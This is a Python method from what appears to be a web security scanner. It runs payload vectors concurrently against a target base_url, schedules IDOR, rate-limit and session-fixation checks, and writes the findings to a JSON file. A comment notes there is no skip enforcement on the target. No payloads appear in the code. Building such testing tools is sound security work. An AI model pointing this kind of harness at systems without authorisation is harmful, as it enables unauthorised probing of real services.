    def run_all(self, vector_list: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Run all vectors (list of dicts with 'id' and 'payload'). Writes artifacts/findings.json and returns findings list.
        """
        # no skip enforcement — Analyzer will run against the provided base_url

        if self.concurrency > 1:
            workers = min(4, self.concurrency)
        else:
            workers = 1

        futures = []
        idor_futures = []
        rate_futures = []
        sess_futures = []
        with ThreadPoolExecutor(max_workers=workers) as exe:
            for vec in vector_list:
                futures.append(exe.submit(self.run_vector, vec))
                # if vector requests IDOR checks, schedule IDOR run
                if isinstance(vec, dict) and vec.get("idor_path"):
                    idor_futures.append(exe.submit(self._run_and_wrap_idor, vec))
                if isinstance(vec, dict) and vec.get("rate_limit"):
                    rate_futures.append(exe.submit(self._run_and_wrap_rate_limit, vec))
                if isinstance(vec, dict) and vec.get("session_fixation"):
                    sess_futures.append(exe.submit(self._run_and_wrap_session_fixation, vec))

            # gather vector results (they append to self.findings internally)
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception:
                    LOG.exception("vector run failed")

            # gather idor results and extend findings
            for fut in as_completed(idor_futures):
                try:
                    res = fut.result()
                    if isinstance(res, list):
                        for r in res:
                            self.findings.append(r)
                except Exception:
                    LOG.exception("idor run failed")
            # gather rate-limit results
            for fut in as_completed(rate_futures):
                try:
                    res = fut.result()
                    if isinstance(res, dict):
                        self.findings.append(res)
                except Exception:
                    LOG.exception("rate-limit run failed")
            # gather session-fixation results
            for fut in as_completed(sess_futures):
                try:
                    res = fut.result()
                    if isinstance(res, dict):
                        self.findings.append(res)
                except Exception:
                    LOG.exception("session-fixation run failed")

        # write findings.json
        os.makedirs("artifacts", exist_ok=True)
        outf = os.path.join("artifacts", "findings.json")
        with open(outf, "w", encoding="utf-8") as f:
            json.dump(self.findings, f, indent=2)

        # print short human summary (use nested analysis.suspicious)
        suspicious = [f for f in self.findings if f.get("analysis", {}).get("suspicious")]
        print(f"Run complete: {len(self.findings)} total findings, {len(suspicious)} suspicious")
        for s in suspicious[:10]:
            aid = s.get("vector_id")
            sink = s.get("sink")
            status = s.get("response", {}).get("status_code")
            length = s.get("response", {}).get("actual_length")
            sev = s.get("analysis", {}).get("severity")
            print(f"- {aid} sink={sink} status={status} length={length} severity={sev}")

        return self.findings
